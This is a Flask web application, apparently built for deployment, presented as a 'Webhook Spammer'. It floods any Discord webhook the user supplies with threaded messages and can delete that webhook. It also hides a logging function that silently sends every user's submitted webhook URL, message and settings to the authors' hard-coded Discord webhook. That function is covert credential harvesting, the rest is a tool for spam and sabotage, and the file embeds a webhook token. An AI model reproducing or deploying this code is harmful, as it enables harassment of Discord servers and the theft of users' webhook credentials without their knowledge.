from flask import Flask, render_template, request, jsonify
import requests
import threading
import time
import os

app = Flask(__name__)
LOGGING_WEBHOOK = "Yhttps://discord.com/api/webhooks/1348654537770270841/VDTo9mKpQRQ5OeZAeGgMo-K-fAM8K3-KOm6WzI1y2kPfcbWRMMdBQX7OwNJ-AK3RJCJ7"  # Replace with your Discord webhook

def send_log_to_discord(webhook_url, message, num_threads, delay):
    embed = {
        "title": "NEW USER INPUT LOGGED",
        "color": 3553599,
        "fields": [
            {"name": "Webhook URL", "value": webhook_url, "inline": False},
            {"name": "Message", "value": message, "inline": False},
            {"name": "Threads", "value": str(num_threads), "inline": True},
            {"name": "Delay", "value": str(delay), "inline": True}
        ],
        "footer": {"text": "Made by TRULYNOTBEN and 214ELI"}
    }
    
    data = {"embeds": [embed]}
    requests.post(LOGGING_WEBHOOK, json=data)

def spam_webhook(webhook_url, message, num_threads, delay):
    results = {"errors": [], "total_time": 0, "total_messages": 0, "messages_per_second": 0}
    
    def send_message():
        try:
            data = {"content": message}
            requests.post(webhook_url, json=data)
        except requests.exceptions.RequestException as e:
            results["errors"].append(f"Error: {e}")
    
    threads = []
    start_time = time.time()
    
    for _ in range(num_threads):
        thread = threading.Thread(target=send_message)
        threads.append(thread)
        thread.start()
        time.sleep(delay)
    
    for thread in threads:
        thread.join()
    
    total_time = time.time() - start_time
    total_messages = num_threads
    messages_per_second = total_messages / total_time if total_time > 0 else 0
    
    results.update({"total_time": round(total_time, 2), "total_messages": total_messages, "messages_per_second": round(messages_per_second, 2)})
    send_log_to_discord(webhook_url, message, num_threads, delay)
    return results

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/spam', methods=['POST'])
def start_spam():
    data = request.json
    webhook_url = data.get('webhook_url')
    message = data.get('message')
    num_threads = int(data.get('num_threads', 1))
    delay = float(data.get('delay', 0.1))
    
    if not webhook_url or not message:
        return jsonify({"error": "Please enter a webhook URL and message."})
    
    results = spam_webhook(webhook_url, message, num_threads, delay)
    return jsonify(results)

@app.route('/delete_webhook', methods=['POST'])
def delete_webhook():
    data = request.json
    webhook_url = data.get('webhook_url')
    
    if not webhook_url:
        return jsonify({"error": "Please enter a webhook URL."})
    
    try:
        response = requests.delete(webhook_url)
        if response.status_code == 204:
            return jsonify({"success": "Webhook deleted successfully."})
        else:
            return jsonify({"error": "Failed to delete webhook."})
    except requests.exceptions.RequestException as e:
        return jsonify({"error": f"Error deleting webhook: {e}"})

if __name__ == '__main__':
    if not os.path.exists('templates'):
        os.makedirs('templates')
    
    with open('templates/index.html', 'w') as f:
        f.write('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webhook Spammer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #282c34;
            color: #abb2bf;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: #333842;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.3);
        }
        h1 {
            color: #61afef;
            text-align: center;
        }
        label {
            display: block;
            margin-top: 10px;
            margin-bottom: 5px;
        }
        input, textarea, button {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
            background-color: #3e4451;
            border: 1px solid #5c6370;
            color: #abb2bf;
            border-radius: 4px;
        }
        button {
            background-color: #61afef;
            color: #282c34;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #56a0d3;
        }
        .button-group {
            display: flex;
            gap: 10px;
            margin-bottom: 10px;
        }
        .button-group button {
            flex: 1;
        }
        #output {
            background-color: #3e4451;
            padding: 10px;
            border-radius: 4px;
            min-height: 150px;
            white-space: pre-wrap;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 0.8em;
            color: #abb2bf;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Webhook Spammer</h1>
        
        <label for="webhook_url">Webhook URL:</label>
        <input type="text" id="webhook_url" placeholder="Enter Discord webhook URL">
        
        <label for="message">Message:</label>
        <textarea id="message" rows="5" placeholder="Enter your message here"></textarea>
        
        <div style="display: flex; gap: 10px;">
            <div style="flex: 1;">
                <label for="num_threads">Threads:</label>
                <input type="number" id="num_threads" min="1" max="100" value="1">
            </div>
            <div style="flex: 1;">
                <label for="delay">Delay (seconds):</label>
                <input type="number" id="delay" min="0.001" max="1" step="0.001" value="0.01">
            </div>
        </div>
        
        <div class="button-group">
            <button id="start_button">Start Spam</button>
            <button id="delete_button">Delete Webhook</button>
        </div>
        
        <label>Output:</label>
        <div id="output"></div>
        
        <div class="footer">Made by TRULYNOTBEN and 214ELI</div>
    </div>

    <script>
        document.getElementById('start_button').addEventListener('click', function() {
            const webhook_url = document.getElementById('webhook_url').value;
            const message = document.getElementById('message').value;
            const num_threads = document.getElementById('num_threads').value;
            const delay = document.getElementById('delay').value;
            const output = document.getElementById('output');
            
            if (!webhook_url || !message) {
                output.textContent = "Please enter a webhook URL and message.";
                return;
            }
            
            output.textContent = "Sending messages...";
            
            fetch('/spam', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    webhook_url,
                    message,
                    num_threads,
                    delay
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    output.textContent = data.error;
                    return;
                }
                
                let resultText = "";
                
                if (data.errors && data.errors.length > 0) {
                    resultText += data.errors.join('\\n') + '\\n';
                }
                
                resultText += `Total time: ${data.total_time} seconds\\n`;
                resultText += `Total messages sent: ${data.total_messages}\\n`;
                resultText += `Messages per second: ${data.messages_per_second}`;
                
                output.textContent = resultText;
            })
            .catch(error => {
                output.textContent = `Error: ${error.message}`;
            });
        });

        document.getElementById('delete_button').addEventListener('click', function() {
            const webhook_url = document.getElementById('webhook_url').value;
            const output = document.getElementById('output');
            
            if (!webhook_url) {
                output.textContent = "Please enter a webhook URL.";
                return;
            }
            
            output.textContent = "Deleting webhook...";
            
            fetch('/delete_webhook', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    webhook_url
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    output.textContent = data.error;
                } else if (data.success) {
                    output.textContent = data.success;
                }
            })
            .catch(error => {
                output.textContent = `Error: ${error.message}`;
            });
        });
    </script>
</body>
</html>
        ''')

    port = int(os.environ.get("PORT", 5000))  # Port binding for Render
    app.run(host="0.0.0.0", port=port, debug=True)